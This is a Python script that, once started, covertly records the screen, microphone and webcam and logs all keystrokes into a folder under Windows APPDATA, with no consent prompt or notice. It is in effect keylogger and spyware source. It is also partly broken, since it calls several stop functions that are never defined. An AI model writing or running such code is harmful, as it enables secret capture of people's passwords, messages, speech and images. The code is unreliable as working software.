import cv2
import pyaudio
import wave
import threading
import time
import os
import atexit
import shutil
from datetime import datetime
from PIL import ImageGrab
import numpy as np
import keyboard
import platform


# Constants
SCREEN_SIZE = (1920, 1080)  # Adjust to your screen resolution
FRAME_RATE = 24
AUDIO_CHUNK_SIZE = 1024
AUDIO_SAMPLE_WIDTH = 2
AUDIO_CHANNELS = 2
AUDIO_RATE = 44100
DATA_FOLDER = os.path.join(os.getenv('APPDATA'), 'DATA')
KEYLOG_FILE = os.path.join(DATA_FOLDER, 'keylog.txt')


def create_data_folder():
    os.makedirs(DATA_FOLDER, exist_ok=True)


def get_video_file_path():
    current_time = datetime.now().strftime("%H-%M_%d-%m-%Y")
    return os.path.join(DATA_FOLDER, f'video_{current_time}.avi')


def get_audio_file_path():
    current_time = datetime.now().strftime("%H-%M_%d-%m-%Y")
    return os.path.join(DATA_FOLDER, f'audio_{current_time}.wav')


def get_webcam_file_path():
    current_time = datetime.now().strftime("%H-%M_%d-%m-%Y")
    return os.path.join(DATA_FOLDER, f'webcamFootage_{current_time}.avi')


def create_audio_stream():
    pa = pyaudio.PyAudio()
    input_device_info = pa.get_default_input_device_info()
    input_channels = input_device_info['maxInputChannels']

    if input_channels < AUDIO_CHANNELS:
        print("Invalid number of audio channels. Using default channels:", input_channels)
        audio_channels = input_channels
    else:
        audio_channels = AUDIO_CHANNELS

    return pa.open(format=pyaudio.paInt16,
                   channels=audio_channels,
                   rate=AUDIO_RATE,
                   input=True,
                   frames_per_buffer=AUDIO_CHUNK_SIZE)


def start_video_recording():
    video_file = get_video_file_path()
    video_writer = cv2.VideoWriter(video_file, cv2.VideoWriter_fourcc(*"XVID"), FRAME_RATE, SCREEN_SIZE)

    while is_recording:
        frame = ImageGrab.grab(bbox=(0, 0, SCREEN_SIZE[0], SCREEN_SIZE[1]))
        frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
        video_writer.write(frame)

    video_writer.release()


def start_audio_recording():
    audio_file = get_audio_file_path()
    audio_frames = []
    audio_stream = create_audio_stream()

    while is_recording:
        audio_data = audio_stream.read(AUDIO_CHUNK_SIZE)
        audio_frames.append(audio_data)

    audio_stream.stop_stream()
    audio_stream.close()

    audio_file = wave.open(audio_file, 'wb')
    audio_file.setnchannels(AUDIO_CHANNELS)
    audio_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
    audio_file.setframerate(AUDIO_RATE)
    audio_file.writeframes(b''.join(audio_frames))
    audio_file.close()


def start_webcam_recording():
    webcam_file = get_webcam_file_path()
    webcam_capture = cv2.VideoCapture(0)
    webcam_writer = cv2.VideoWriter(webcam_file, cv2.VideoWriter_fourcc(*"XVID"), FRAME_RATE, SCREEN_SIZE)

    while is_recording:
        ret, frame = webcam_capture.read()
        if ret:
            webcam_writer.write(frame)

    webcam_capture.release()
    webcam_writer.release()


def start_keylogger():
    with open(KEYLOG_FILE, "w") as f:
        pass  # Create an empty keylog file

    keyboard.on_press(lambda event: on_press(event))

    while is_keylogger_running:
        time.sleep(1)

    keyboard.unhook_all()


def on_press(event):
    key = event.name
    with open(KEYLOG_FILE, "a") as f:
        if key in ["space", "backspace", "shift", "esc"]:
            f.write("\n" + key + "\n")
        else:
            f.write(key)


def save_recordings():
    if is_video_recording:
        stop_video_recording()

    if is_audio_recording:
        stop_audio_recording()

    if is_webcam_recording:
        stop_webcam_recording()

    if is_keylogger_running:
        stop_keylogger()

    if platform.system() == "Windows":
        final_video_path = os.path.join(DATA_FOLDER, os.path.basename(get_video_file_path()))
        final_audio_path = os.path.join(DATA_FOLDER, os.path.basename(get_audio_file_path()))
        final_webcam_path = os.path.join(DATA_FOLDER, os.path.basename(get_webcam_file_path()))

        shutil.move(get_video_file_path(), final_video_path)
        shutil.move(get_audio_file_path(), final_audio_path)
        shutil.move(get_webcam_file_path(), final_webcam_path)


def cleanup():
    save_recordings()
    os.remove(KEYLOG_FILE)


def start_recording(duration):
    global is_recording, is_video_recording, is_audio_recording, is_webcam_recording, is_keylogger_running

    create_data_folder()

    is_recording = True
    is_video_recording = True
    is_audio_recording = True
    is_webcam_recording = True
    is_keylogger_running = True

    video_thread = threading.Thread(target=start_video_recording)
    audio_thread = threading.Thread(target=start_audio_recording)
    webcam_thread = threading.Thread(target=start_webcam_recording)
    keylogger_thread = threading.Thread(target=start_keylogger)

    video_thread.start()
    audio_thread.start()
    webcam_thread.start()
    keylogger_thread.start()

    time.sleep(duration)

    save_recordings()


if __name__ == "__main__":
    duration = 10  # Set the recording duration in seconds
    is_recording = False
    is_video_recording = False
    is_audio_recording = False
    is_webcam_recording = False
    is_keylogger_running = False

    atexit.register(cleanup)
    start_recording(duration)
